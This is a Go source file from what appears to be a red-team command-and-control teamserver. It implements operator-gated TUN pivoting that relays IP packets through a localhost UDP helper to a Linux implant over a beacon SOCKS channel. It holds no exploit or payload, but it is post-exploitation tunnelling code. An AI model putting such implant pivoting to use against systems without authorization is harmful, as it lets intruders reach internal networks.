package server

import (
	"fmt"
	"log/slog"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
)

// tunEngine pairs a Linux implant TUN with a teamserver UDP helper.
// Each UDP datagram on 127.0.0.1:port is one IP packet framed as tun_data
// over the beacon SOCKS channel. Windows/macOS implants return an honest
// error (Wintun is not bundled). The teamserver does not open a TAP.

type tunEngine struct {
	mu       sync.Mutex
	sessions map[string]*tunSession
}

type tunSession struct {
	agentID  string
	cidr     string
	iface    string
	status   string
	udpConn  *net.UDPConn
	lastPeer *net.UDPAddr
	port     int
	pending  [][]byte
	mu       sync.Mutex
	stop     chan struct{}
}

func newTunEngine() *tunEngine {
	return &tunEngine{sessions: make(map[string]*tunSession)}
}

func (e *tunEngine) get(agentID string) *tunSession {
	e.mu.Lock()
	defer e.mu.Unlock()
	return e.sessions[agentID]
}

func (e *tunEngine) startUDP(s *Server, agentID, cidr string, port int) (int, error) {
	e.mu.Lock()
	if sess, ok := e.sessions[agentID]; ok && sess.udpConn != nil {
		e.mu.Unlock()
		return sess.port, nil
	}
	e.mu.Unlock()

	addr := &net.UDPAddr{IP: net.ParseIP("127.0.0.1"), Port: port}
	pc, err := net.ListenUDP("udp", addr)
	if err != nil {
		return 0, err
	}
	actual := pc.LocalAddr().(*net.UDPAddr).Port
	sess := &tunSession{
		agentID: agentID,
		cidr:    cidr,
		status:  "starting",
		udpConn: pc,
		port:    actual,
		stop:    make(chan struct{}),
	}
	e.mu.Lock()
	e.sessions[agentID] = sess
	e.mu.Unlock()
	go e.udpLoop(sess)
	return actual, nil
}

func (e *tunEngine) udpLoop(sess *tunSession) {
	buf := make([]byte, 65535)
	for {
		select {
		case <-sess.stop:
			return
		default:
		}
		_ = sess.udpConn.SetReadDeadline(time.Now().Add(2 * time.Second))
		n, peer, err := sess.udpConn.ReadFromUDP(buf)
		if err != nil {
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				continue
			}
			select {
			case <-sess.stop:
				return
			default:
			}
			slog.Warn("tun UDP helper read", "agent_id", sess.agentID, "err", err)
			return
		}
		if n == 0 {
			continue
		}
		pkt := make([]byte, n)
		copy(pkt, buf[:n])
		sess.mu.Lock()
		sess.lastPeer = peer
		if len(sess.pending) < 256 {
			sess.pending = append(sess.pending, pkt)
		}
		sess.mu.Unlock()
	}
}

func (e *tunEngine) drain(agentID string) []socksFrame {
	e.mu.Lock()
	sess := e.sessions[agentID]
	e.mu.Unlock()
	if sess == nil {
		return nil
	}
	sess.mu.Lock()
	pending := sess.pending
	sess.pending = nil
	sess.mu.Unlock()
	if len(pending) == 0 {
		return nil
	}
	frames := make([]socksFrame, 0, len(pending))
	for _, pkt := range pending {
		frames = append(frames, socksFrame{ConnID: 0, Action: "tun_data", Data: pkt})
	}
	return frames
}

func (e *tunEngine) handleAgentFrame(agentID, action string, data []byte) {
	e.mu.Lock()
	sess := e.sessions[agentID]
	e.mu.Unlock()
	if sess == nil {
		if action == "tun_up" || action == "tun_data" {
			sess = &tunSession{agentID: agentID, status: "up"}
			e.mu.Lock()
			e.sessions[agentID] = sess
			e.mu.Unlock()
		} else {
			return
		}
	}
	switch action {
	case "tun_up":
		sess.mu.Lock()
		sess.status = "up"
		sess.iface = strings.TrimSpace(string(data))
		sess.mu.Unlock()
	case "tun_down":
		sess.mu.Lock()
		sess.status = "down"
		sess.mu.Unlock()
	case "tun_data":
		sess.mu.Lock()
		pc, peer := sess.udpConn, sess.lastPeer
		sess.mu.Unlock()
		if pc != nil && peer != nil && len(data) > 0 {
			_, _ = pc.WriteToUDP(data, peer)
		}
	}
}

func (e *tunEngine) stop(agentID string) error {
	e.mu.Lock()
	sess, ok := e.sessions[agentID]
	if !ok {
		e.mu.Unlock()
		return fmt.Errorf("no tun helper for agent %s", agentID)
	}
	delete(e.sessions, agentID)
	e.mu.Unlock()
	close(sess.stop)
	if sess.udpConn != nil {
		_ = sess.udpConn.Close()
	}
	return nil
}

func (e *tunEngine) active(agentID string) bool {
	sess := e.get(agentID)
	if sess == nil {
		return false
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	return sess.status == "up" || sess.udpConn != nil
}

func (s *Server) handleTunStart(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	cidr := strings.TrimSpace(c.PostForm("cidr"))
	if cidr == "" {
		cidr = "10.66.0.2/24"
	}
	port := 0
	if v := c.PostForm("udp_port"); v != "" {
		n, err := strconv.Atoi(v)
		if err != nil || n < 0 || n > 65535 {
			respondError(c, http.StatusBadRequest, "invalid udp_port")
			return
		}
		port = n
	}
	if s.tunEngine == nil {
		s.tunEngine = newTunEngine()
	}
	actual, err := s.tunEngine.startUDP(s, id, cidr, port)
	if err != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "tun helper"))
		return
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "tun_start", Command: cidr})
	if task == nil {
		// Roll back the local UDP listener; the error response is already written.
		_ = s.tunEngine.stop(id)
		return
	}
	s.LogAuditRecord(c, "tun_start", "agent", id, fmt.Sprintf("cidr=%s udp=127.0.0.1:%d", cidr, actual), true, nil)
	s.broadcastTaskUpdate(task.AgentID, *task)
	c.JSON(http.StatusOK, gin.H{
		"success":  true,
		"task_id":  task.ID,
		"cidr":     cidr,
		"udp_host": "127.0.0.1",
		"udp_port": actual,
		"note":     "Linux implant opens /dev/net/tun; each UDP datagram on 127.0.0.1 is one IP packet. Windows/macOS implants return an honest error (Wintun is not bundled).",
	})
}

func (s *Server) handleTunStop(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if s.tunEngine != nil {
		_ = s.tunEngine.stop(id)
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "tun_stop"})
	if task == nil {
		return
	}
	s.dispatchTask(c, task, "tun_stop", "")
}

func (s *Server) handleTunStatus(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	out := gin.H{"success": true, "running": false, "host": "127.0.0.1"}
	if s.tunEngine != nil {
		if sess := s.tunEngine.get(id); sess != nil {
			sess.mu.Lock()
			out["running"] = sess.status == "up" || sess.udpConn != nil
			out["status"] = sess.status
			out["cidr"] = sess.cidr
			out["iface"] = sess.iface
			out["udp_port"] = sess.port
			sess.mu.Unlock()
		}
	}
	c.JSON(http.StatusOK, out)
}
